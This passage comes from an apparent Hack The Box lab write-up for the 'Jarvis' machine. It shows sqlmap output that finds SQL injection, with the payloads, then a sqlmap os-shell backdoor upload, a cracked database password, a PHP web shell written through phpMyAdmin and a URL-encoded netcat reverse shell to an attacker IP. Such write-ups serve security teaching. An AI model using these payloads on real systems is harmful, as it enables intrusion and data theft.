<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>      
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>    
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>         
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'PostgreSQL AND error-based - WHERE or HAVING clause'</span>           
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 error-based - Parameter replace (EXP)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL inline queries'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'PostgreSQL inline queries'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Microsoft SQL Server/Sybase inline queries'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">07</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt; 5.0.11 stacked queries (comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt; 5.0.11 stacked queries'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt; 5.0.11 stacked queries (query SLEEP - comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt; 5.0.11 stacked queries (query SLEEP)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &lt; 5.0.12 stacked queries (heavy query)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'PostgreSQL &gt; 8.1 stacked queries (comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Microsoft SQL Server/Sybase stacked queries (comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.0.12 AND time-based blind'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="n">appears</span> <span class="k">to</span> <span class="n">be</span> <span class="s1">'MySQL &gt;= 5.0.12 AND time-based blind'</span> <span class="n">injectable</span> 
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">automatically</span> <span class="n">extending</span> <span class="n">ranges</span> <span class="k">for</span> <span class="k">UNION</span> <span class="n">query</span> <span class="n">injection</span> <span class="n">technique</span> <span class="n">tests</span> <span class="k">as</span> <span class="n">there</span> <span class="k">is</span> <span class="k">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">other</span> <span class="p">(</span><span class="n">potential</span><span class="p">)</span> <span class="n">technique</span> <span class="k">found</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="s1">'ORDER BY'</span> <span class="n">technique</span> <span class="n">appears</span> <span class="k">to</span> <span class="n">be</span> <span class="n">usable</span><span class="p">.</span> <span class="n">This</span> <span class="n">should</span> <span class="n">reduce</span> <span class="n">the</span> <span class="nb">time</span> <span class="n">needed</span> <span class="k">to</span> <span class="n">find</span> <span class="n">the</span> <span class="k">right</span> <span class="n">number</span> <span class="k">of</span> <span class="n">query</span> <span class="n">columns</span><span class="p">.</span> <span class="n">Automatically</span> <span class="n">extending</span> <span class="n">the</span> <span class="n">range</span> <span class="k">for</span> <span class="k">current</span> <span class="k">UNION</span> <span class="n">query</span> <span class="n">injection</span> <span class="n">tech</span>
<span class="n">nique</span> <span class="n">test</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">appears</span> <span class="k">to</span> <span class="n">have</span> <span class="mi">7</span> <span class="n">columns</span> <span class="k">in</span> <span class="n">query</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">28</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="k">is</span> <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span> <span class="n">injectable</span>
<span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="k">is</span> <span class="n">vulnerable</span><span class="p">.</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="k">to</span> <span class="n">keep</span> <span class="n">testing</span> <span class="n">the</span> <span class="n">others</span> <span class="p">(</span><span class="n">if</span> <span class="k">any</span><span class="p">)</span><span class="o">?</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
<span class="n">sqlmap</span> <span class="n">identified</span> <span class="n">the</span> <span class="n">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">with</span> <span class="n">a</span> <span class="n">total</span> <span class="k">of</span> <span class="mi">80</span> <span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">requests</span><span class="p">:</span>
<span class="c1">---</span>
<span class="k">Parameter</span><span class="p">:</span> <span class="n">cod</span> <span class="p">(</span><span class="k">GET</span><span class="p">)</span>
    <span class="k">Type</span><span class="p">:</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
    <span class="n">Title</span><span class="p">:</span> <span class="k">AND</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="k">WHERE</span> <span class="k">or</span> <span class="k">HAVING</span> <span class="n">clause</span>
    <span class="n">Payload</span><span class="p">:</span> <span class="n">cod</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">9726</span><span class="o">=</span><span class="mi">9726</span>

    <span class="k">Type</span><span class="p">:</span> <span class="nb">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span> <span class="k">AND</span> <span class="nb">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
    <span class="n">Payload</span><span class="p">:</span> <span class="n">cod</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

    <span class="k">Type</span><span class="p">:</span> <span class="k">UNION</span> <span class="n">query</span>
    <span class="n">Title</span><span class="p">:</span> <span class="n">Generic</span> <span class="k">UNION</span> <span class="n">query</span> <span class="p">(</span><span class="k">NULL</span><span class="p">)</span> <span class="o">-</span> <span class="mi">7</span> <span class="n">columns</span>
    <span class="n">Payload</span><span class="p">:</span> <span class="n">cod</span><span class="o">=-</span><span class="mi">6795</span> <span class="k">UNION</span> <span class="k">ALL</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7178786b71</span><span class="p">,</span><span class="mi">0</span><span class="n">x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b</span><span class="p">,</span><span class="mi">0</span><span class="n">x717a626271</span><span class="p">),</span><span class="k">NULL</span><span class="c1">-- HCXr</span>
<span class="c1">---</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="n">MySQL</span>
<span class="n">web</span> <span class="n">server</span> <span class="n">operating</span> <span class="k">system</span><span class="p">:</span> <span class="n">Linux</span> <span class="n">Debian</span> <span class="mi">9</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">stretch</span><span class="p">)</span>
<span class="n">web</span> <span class="n">application</span> <span class="n">technology</span><span class="p">:</span> <span class="n">Apache</span> <span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">25</span>
<span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetched</span> <span class="k">data</span> <span class="n">logged</span> <span class="k">to</span> <span class="nb">text</span> <span class="n">files</span> <span class="k">under</span> <span class="s1">'/root/.sqlmap/output/jarvis.htb'</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ending</span> <span class="o">@</span> <span class="mi">22</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">08</span><span class="o">/</span>

<span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">jarvis</span><span class="o">#</span>
</code></pre></div></div>

<h2 id="rce--shell-as-www-data">RCE –&gt; Shell as www-data</h2>
<p>I could get RCE in 2 different ways.<br></p>
<h3 id="first-way">First way:</h3>
<p>By using the <code class="language-plaintext highlighter-rouge">os-shell</code> option in <code class="language-plaintext highlighter-rouge">sqlmap</code>:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">jarvis</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jarvis</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">room</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cod</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell                                    </span>
        <span class="n">___</span>           
       <span class="n">__H__</span>
 <span class="n">___</span> <span class="n">___</span><span class="p">[,]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">#</span><span class="k">stable</span><span class="err">}</span>
<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[</span><span class="nv">"]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org                       
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no
 liability and are not responsible for any misuse or damage caused by this program
 
[*] starting @ 22:23:10 /2019-11-08/
[22:23:10] [INFO] resuming back-end DBMS 'mysql'
[22:23:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 9726=9726

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 
---
[22:23:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL &gt;= 5.0.12
[22:23:11] [INFO] going to use a web backdoor for command prompt
[22:23:11] [INFO] fingerprinting the back-end DBMS operating system
[22:23:11] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
&gt; 4
[22:23:13] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
&gt; 2
please provide a comma separate list of absolute directory paths: /var/www/html
[22:23:40] [INFO] retrieved web server absolute paths: '/images/'
[22:23:40] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[22:23:42] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://jarvis.htb:80/tmpuujaq.php
[22:23:43] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://jarvis.htb:80/tmpbtwbt.php
[22:23:43] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell&gt; whoami
do you want to retrieve the command standard output? [Y/n/a] a
command standard output: 'www-data'
os-shell&gt; id
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell&gt;
</span></code></pre></div></div>
<p>From here we can simply execute a reverse shell command and get a shell.<br></p>
<h3 id="second-way">Second way:</h3>
<p>I used the <code class="language-plaintext highlighter-rouge">--passwords</code> option to dump the users’ password hashes:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">jarvis</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jarvis</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">room</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cod</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords                                  </span>
        <span class="n">___</span>
       <span class="n">__H__</span>
 <span class="n">___</span> <span class="n">___</span><span class="p">[,]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">#</span><span class="k">stable</span><span class="err">}</span>
<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[,]</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">'| . |
|___|_  ['</span><span class="p">]</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">__</span><span class="p">,</span><span class="o">|</span>  <span class="n">_</span><span class="o">|</span>
      <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">V</span><span class="p">...</span>       <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sqlmap</span><span class="p">.</span><span class="n">org</span>

<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">legal</span> <span class="n">disclaimer</span><span class="p">:</span> <span class="k">Usage</span> <span class="k">of</span> <span class="n">sqlmap</span> <span class="k">for</span> <span class="n">attacking</span> <span class="n">targets</span> <span class="k">without</span> <span class="k">prior</span> <span class="n">mutual</span> <span class="n">consent</span> <span class="k">is</span> <span class="n">illegal</span><span class="p">.</span> <span class="n">It</span> <span class="k">is</span> <span class="n">the</span> <span class="k">end</span> <span class="k">user</span><span class="s1">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:17:45 /2019-11-08/

[22:17:46] [INFO] resuming back-end DBMS '</span><span class="n">mysql</span><span class="s1">'
[22:17:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 9726=9726

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 
---
[22:17:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL &gt;= 5.0.12
[22:17:46] [INFO] fetching database users password hashes
[22:17:46] [INFO] used SQL query returns 1 entry
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:17:53] [INFO] writing hashes to a temporary file '</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sqlmapbAZ4vg2489</span><span class="o">/</span><span class="n">sqlmaphashes</span><span class="o">-</span><span class="n">KkbVkR</span><span class="p">.</span><span class="n">txt</span><span class="s1">' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0

[22:17:55] [INFO] fetched data logged to text files under '</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">sqlmap</span><span class="o">/</span><span class="k">output</span><span class="o">/</span><span class="n">jarvis</span><span class="p">.</span><span class="n">htb</span><span class="s1">'

[*] ending @ 22:17:55 /2019-11-08/

root@kali:~/Desktop/HTB/boxes/jarvis# 
</span></code></pre></div></div>
<p>I got the password hash for <code class="language-plaintext highlighter-rouge">DBadmin</code>, I cracked it with <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a>:
<br><img src="/images/hackthebox/jarvis/10.png" alt="" class="align-center"><br><br>
Then I tried these credentials (<code class="language-plaintext highlighter-rouge">DBadmin : imissyou</code>) with <code class="language-plaintext highlighter-rouge">phpmyadmin</code> and I got in:
<br><img src="/images/hackthebox/jarvis/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/12.png" alt="" class="align-center"><br><br>
From the <code class="language-plaintext highlighter-rouge">SQL</code> console we can write a web shell:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="nv">"&lt;?php system($_GET['c']); ?&gt;"</span> <span class="k">into</span> <span class="n">outfile</span> <span class="nv">"/var/www/html/sh3ll.php"</span>
</code></pre></div></div>

<p><br><img src="/images/hackthebox/jarvis/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/15.png" alt="" class="align-center"><br><br></p>

<p>I used the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd" target="_blank" rel="noopener noreferrer">netcat openbsd reverse shell payload</a> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> to get a reverse shell, I had to <code class="language-plaintext highlighter-rouge">url</code>-encode it first:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
</code></pre></div></div>

<p><br><img src="/images/hackthebox/jarvis/16.png" alt="" class="align-center"><br><br></p>

<p>Now we have a shell as <code class="language-plaintext highlighter-rouge">www-data</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis# nc -lvnp 1337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:57400.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@jarvis:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/jarvis# stty raw -echo 
root@kali:~/Desktop/HTB/boxes/jarvis# nc -lvnp 1337

www-data@jarvis:/var/www/html$ export TERM=screen
www-data@jarvis:/var/www/html$ 
</code></pre></div></div>

<h2 id="command-injection-in-simplerpy--shell-as-pepper--user-flag">Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag</h2>
<p>I checked the home directory and there was a user called <code class="language-plaintext highlighter-rouge">pepper</code>, I couldn’t read the user flag as <code class="language-plaintext highlighter-rouge">www-data</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/var/www/html$ cd /home/
www-data@jarvis:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Mar  2  2019 .
drwxr-xr-x 23 root   root   4096 Mar  3  2019 ..
drwxr-xr-x  4 pepper pepper 4096 Mar  5  2019 pepper
www-data@jarvis:/home$ cd pepper/
www-data@jarvis:/home/pepper$ ls -al
total 32
drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .
